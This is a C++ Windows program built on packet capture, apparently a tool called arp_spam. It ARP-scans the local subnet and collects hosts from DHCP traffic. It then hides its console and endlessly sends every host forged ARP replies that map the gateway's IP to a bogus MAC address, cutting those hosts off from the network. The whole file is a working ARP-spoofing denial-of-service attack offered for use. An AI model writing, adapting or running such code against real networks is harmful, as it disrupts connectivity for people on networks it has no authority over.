#define WIN32_LEAN_AND_MEAN
#define SPOOFING_MAC "\xBE\xEF\xDE\xAD\xBE\xEF"
#define CYCLE_SECONDS 3

#include <iostream>
#include <iomanip>
#include <sstream>
#include <windows.h>
#include <ws2tcpip.h>
#include <winsock2.h>
#include <iphlpapi.h>
#include <pcap.h>
#include <thread>

using std::cout;
using std::wcout;
using std::cin;

struct client_info
{
	char ip[4];
	char mac[6];
};
struct arp_packet
{
	char eth_dst[6];
	char eth_src[6];
	char eth_type[2] = { 0x08, 0x06 };
	char arp_hw_type[2] = { 0x00, 0x01 };
	char arp_proto_type[2] = { 0x08, 0x00 };
	char arp_hw_size = 0x06;
	char arp_proto_size = 0x04;
	char arp_opcode[2];
	char arp_src[6];
	char sender_ip[4];
	char arp_dst[6];
	char dst_ip[4];
};
const char* retrieveName(const char* name);
sockaddr* getGateway(const char* adapter_name, PIP_ADAPTER_ADDRESSES adapters);
char* getPhysicalAddress(const char* adapter_name, PIP_ADAPTER_ADDRESSES adapters);
void h_arpAdd(u_char* user, const struct pcap_pkthdr* pkt_header, const u_char* pkt_data);
void arp_scan(pcap_t* device, const char* device_name, PIP_ADAPTER_ADDRESSES adapter, const char* PhysicalAddressString);
void rawBytesToMacString(char* dst, char* src);
void thr_dhcp(pcap_t* device);
void thr_send_arp_packets(pcap_t* device, const char* device_name, PIP_ADAPTER_ADDRESSES adapter);
void thr_receive_arp_packets(pcap_t* device, const char* PhysicalAddressString);
PIP_ADAPTER_ADDRESSES getAdapterByName(const char* device, PIP_ADAPTER_ADDRESSES adapters);
int reverseIntBytes(int integer);

const char* asterisk = "[ * ] ";
int nodes_index;
client_info nodes[50];
sockaddr_in* gateway;

int main(int argc, char** argv)
{
	cout << asterisk << "List of available network interfaces:\n";
	char errbuf[PCAP_ERRBUF_SIZE];
	char PhysicalAddressString[18];
	pcap_if_t* alldevs;
	pcap_if_t* choosable[10] = { 0 };
	pcap_t* curr_device;
	pcap_findalldevs(&alldevs, errbuf);

	ULONG buffer_len = 15000;
	char* buffer = new char[buffer_len];
	PIP_ADAPTER_ADDRESSES adapters;
	PIP_ADAPTER_ADDRESSES curr_adapter;
	adapters = (PIP_ADAPTER_ADDRESSES) buffer;
	while (GetAdaptersAddresses(AF_INET,
		GAA_FLAG_SKIP_ANYCAST | GAA_FLAG_SKIP_FRIENDLY_NAME | GAA_FLAG_SKIP_DNS_INFO | GAA_FLAG_SKIP_DNS_SERVER |
		GAA_FLAG_INCLUDE_GATEWAYS, NULL, adapters, &buffer_len) == ERROR_BUFFER_OVERFLOW)
	{
		buffer_len += buffer_len;
		delete[] buffer;
		buffer = new char[buffer_len];
	}

	int i = 1;
	while (alldevs)
	{
		if ((gateway = (sockaddr_in*)getGateway(alldevs->name, adapters)) == NULL)
		{
			alldevs = alldevs->next;
			continue;
		}
		cout << "Name: "; wcout << alldevs->description << '\n';
		cout << "Gateway: " << inet_ntoa(gateway->sin_addr) << "\n";
		cout << "Number: " << i << "\n\n";
		choosable[i - 1] = alldevs;
		alldevs = alldevs->next;
		i++;
	}
	if (choosable[0] == NULL)
	{
		cout << "There are no available interfaces...\n";
		exit(-1);
	}
	int variant;
	cout << asterisk << "Choose interface: ";
	cin >> variant;
	variant--;

	while (choosable[variant] == NULL || variant < 0 || variant > 10)
	{
		cout << "You pick the wrong number.\n"
			 << "Try again...\n\n"
			 << asterisk << "Choose interface: ";
		cin >> variant;
	}
	if ((curr_device = pcap_open_live(choosable[variant]->name, 350, false, 1000, errbuf)) == NULL)
	{
		cout << errbuf << '\n';
		exit(-1);
	}
	curr_adapter = getAdapterByName(choosable[variant]->name, adapters);
	gateway = (sockaddr_in*)getGateway(curr_adapter->AdapterName, adapters);
	rawBytesToMacString(PhysicalAddressString, getPhysicalAddress(choosable[variant]->name, adapters));
	cout << asterisk << "ARP scanning...\n";

	arp_scan(curr_device, choosable[variant]->name, curr_adapter, PhysicalAddressString);

	cout << asterisk << "Targets list:\n";
	if (nodes[0].ip[0] == '\0')
	{
		cout << "No network nodes found.\n";
	}
	else
	{
		for (int i = 0; nodes[i].ip[0] != '\0'; i++)
		{
			static in_addr address;
			memcpy(&address.S_un.S_un_b, nodes[i].ip, 4);
			cout << "* " << inet_ntoa(address) << '\n';
		}
	}

	cout << asterisk << "Starting DHCP listener...";
	std::thread dhcp_thread(thr_dhcp, curr_device);
	cout << " OK.\n";
	
	arp_packet packet;
	memcpy(packet.arp_opcode, "\0\x2", 2);
	memcpy(packet.eth_src, getPhysicalAddress(choosable[variant]->name, adapters), 6);
	memcpy(packet.arp_src, SPOOFING_MAC, 6);
	memcpy(packet.sender_ip, &gateway->sin_addr.S_un.S_un_b, 4);

	cout << asterisk << "You can close console window now.\nTo stop the spam, run the following command as administrator in the console: taskkill /im arp_spam.exe /f";
	FreeConsole();
	
	while (true)
	{
		int i = 0;
		while (nodes[i].ip[0] != '\0')
		{
			memcpy(packet.eth_dst, nodes[i].mac, 6);
			memcpy(packet.arp_dst, nodes[i].mac, 6);
			memcpy(packet.dst_ip, nodes[i].ip, 4);
			pcap_sendpacket(curr_device, (u_char*)&packet, sizeof(packet));
			i++;
		}
		Sleep(500);
	}
	return 0;
}
sockaddr* getGateway(const char* adapter_name, PIP_ADAPTER_ADDRESSES adapters)
{
	PIP_ADAPTER_ADDRESSES first = adapters;
	static sockaddr gateway = { 0 };
	const char* _adapter_name = retrieveName(adapter_name);
	while (adapters)
	{
		if (strcmp(_adapter_name, adapters->AdapterName) == 0)
		{
			if (adapters->FirstGatewayAddress == NULL)
			{
				adapters = first;
				return NULL;
			}
			memcpy(gateway.sa_data, adapters->FirstGatewayAddress->Address.lpSockaddr->sa_data, 14);
			adapters = first;
			return &gateway;
		}
		adapters = adapters->Next;
	}
	adapters = first;
	return NULL;
}
char* getPhysicalAddress(const char* adapter_name, PIP_ADAPTER_ADDRESSES adapters)
{
	PIP_ADAPTER_ADDRESSES first = adapters;
	const char* _adapter_name = retrieveName(adapter_name);
	while (adapters)
	{
		if (strcmp(_adapter_name, adapters->AdapterName) == 0)
		{
			PIP_ADAPTER_ADDRESSES temp = adapters;
			adapters = first;
			return (char*)temp->PhysicalAddress;
		}
		adapters = adapters->Next;
	}
	adapters = first;
	return NULL;
}
PIP_ADAPTER_ADDRESSES getAdapterByName(const char* device, PIP_ADAPTER_ADDRESSES adapters)
{
	PIP_ADAPTER_ADDRESSES first = adapters;
	const char* _device = retrieveName(device);
	while (adapters)
	{
		if (strcmp(_device, adapters->AdapterName) == 0)
		{
			PIP_ADAPTER_ADDRESSES temp = adapters;
			adapters = first;
			return temp;
		}
		adapters = adapters->Next;
	}
	adapters = first;
	return NULL;
}
const char* retrieveName(const char* name)
{
	for (int i = 0; ; i++)
	{
		if (name[i] == '{')
		{
			return &name[i];
		}
	}
	return NULL;
}
void rawBytesToMacString(char* dst, char* src)
{
	std::stringstream ss;
	
	for (int i = 0; i < 6; i++)
	{
		ss << std::hex << std::uppercase << std::setw(2) << std::setfill('0') << (unsigned int)(unsigned char)src[i];
		if (i != 5)
		{
			ss << ':';
		}
	}
	strcpy(dst, ss.str().c_str());
}
void h_arpAdd(u_char* user, const struct pcap_pkthdr* pkt_header, const u_char* pkt_data)
{
	if (nodes_index == 50)
	{
		return;
	}
	if (memcmp(&gateway->sin_addr.S_un.S_un_b, &pkt_data[28], 4) == 0)
	{
		return;
	}
	memcpy(nodes[nodes_index].ip, &pkt_data[28], 4);
	memcpy(nodes[nodes_index].mac, &pkt_data[6], 6);
	nodes_index++;
}
void h_dhcpAdd(u_char* user, const struct pcap_pkthdr* pkt_header, const u_char* pkt_data)
{
	if (nodes_index == 50)
	{
		return;
	}
	memcpy(nodes[nodes_index].mac, &pkt_data[70], 6);
	memcpy(nodes[nodes_index].ip, &pkt_data[296], 4);
	nodes_index++;
}
void thr_send_arp_packets(pcap_t* device, const char* device_name, PIP_ADAPTER_ADDRESSES adapter)
{
	arp_packet packet;
	sockaddr_in* address = (sockaddr_in*)adapter->FirstUnicastAddress->Address.lpSockaddr;
	memcpy(packet.arp_opcode, "\0\x1", 2);
	memcpy(packet.eth_dst, "\xff\xff\xff\xff\xff\xff", 6);
	memcpy(packet.eth_src, adapter->PhysicalAddress, 6);
	memcpy(packet.arp_src, adapter->PhysicalAddress, 6);
	memcpy(packet.sender_ip, (u_char*)&address->sin_addr.S_un.S_un_b.s_b1, 4);
	memcpy(packet.arp_dst, "\0\0\0\0\0\0", 6);

	char errbuf[PCAP_ERRBUF_SIZE];
	bpf_u_int32 net;
	bpf_u_int32 mask;

	pcap_lookupnet(device_name, &net, &mask, errbuf);
	net = htonl(net);
	mask = htonl(mask);

	while (mask != (unsigned int)-2)
	{
		net++;
		mask++;
		net = reverseIntBytes(net);
		memcpy(packet.dst_ip, &net, 4);
		net = reverseIntBytes(net);

		pcap_sendpacket(device, (u_char*)&packet, sizeof(packet));
	}
}
void thr_dhcp(pcap_t* device)
{
	bpf_program filter;
	pcap_compile(device, &filter, "src port 68", 1, PCAP_NETMASK_UNKNOWN);
	pcap_setfilter(device, &filter);
	pcap_loop(device, 0, h_dhcpAdd, NULL);
}
void thr_receive_arp_packets(pcap_t* curr_device, const char* PhysicalAddressString)
{
	bpf_program filter;
	char filter_string[50] = "arp and ether dst ";
	strcat(filter_string, PhysicalAddressString);
	pcap_compile(curr_device, &filter, filter_string, 1, PCAP_NETMASK_UNKNOWN);
	pcap_setfilter(curr_device, &filter);
	pcap_loop(curr_device, 50, h_arpAdd, NULL);
}
void arp_scan(pcap_t* device, const char* device_name, PIP_ADAPTER_ADDRESSES adapter, const char* PhysicalAddressString)
{
	using std::thread;
	thread t1(thr_receive_arp_packets, device, PhysicalAddressString);
	thread t2(thr_send_arp_packets, device, device_name, adapter);
	t2.join();
	Sleep(15000);
	pcap_breakloop(device);
	t1.join();
}
int reverseIntBytes(int integer)
{
	char* raw = (char*) &integer;
	char temp;
	
	temp = raw[0];
	raw[0] = raw[3];
	raw[3] = temp;

	temp = raw[1];
	raw[1] = raw[2];
	raw[2] = temp;

	return integer;
}
